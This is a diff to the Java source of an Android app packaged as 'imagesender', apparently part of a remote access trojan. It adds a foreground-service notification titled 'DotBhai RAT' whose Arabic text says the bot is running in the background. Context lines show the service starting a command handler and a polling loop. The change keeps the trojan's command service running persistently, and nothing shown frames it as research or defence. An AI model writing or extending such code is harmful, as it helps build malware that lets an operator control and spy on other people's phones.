@@ -1,7 +1,11 @@
 package com.dotbhai.imagesender;
 
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
 import android.app.Service;
 import android.content.Intent;
+import android.os.Build;
 import android.os.IBinder;
 import android.util.Log;
 import org.json.JSONArray;
@@ -18,6 +22,34 @@ public class BotCommandService extends Service {
     @Override
     public void onCreate() {
         super.onCreate();
+        
+        try {
+            String CHANNEL_ID = "bot_channel";
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                NotificationChannel serviceChannel = new NotificationChannel(
+                        CHANNEL_ID, "Bot Service Channel", NotificationManager.IMPORTANCE_LOW);
+                NotificationManager manager = getSystemService(NotificationManager.class);
+                if (manager != null) manager.createNotificationChannel(serviceChannel);
+            }
+            
+            Notification.Builder builder;
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                builder = new Notification.Builder(this, CHANNEL_ID);
+            } else {
+                builder = new Notification.Builder(this);
+            }
+            
+            Notification notification = builder
+                    .setContentTitle("DotBhai RAT")
+                    .setContentText("البوت شغال في الخلفية...")
+                    .setSmallIcon(android.R.drawable.ic_menu_manage)
+                    .build();
+                    
+            startForeground(1, notification);
+        } catch (Exception e) {
+            Log.e("BotSvc", "Notification error: " + e.getMessage());
+        }
+
         handler = new CommandHandler(this);
         new Thread(this::pollLoop).start();
     }
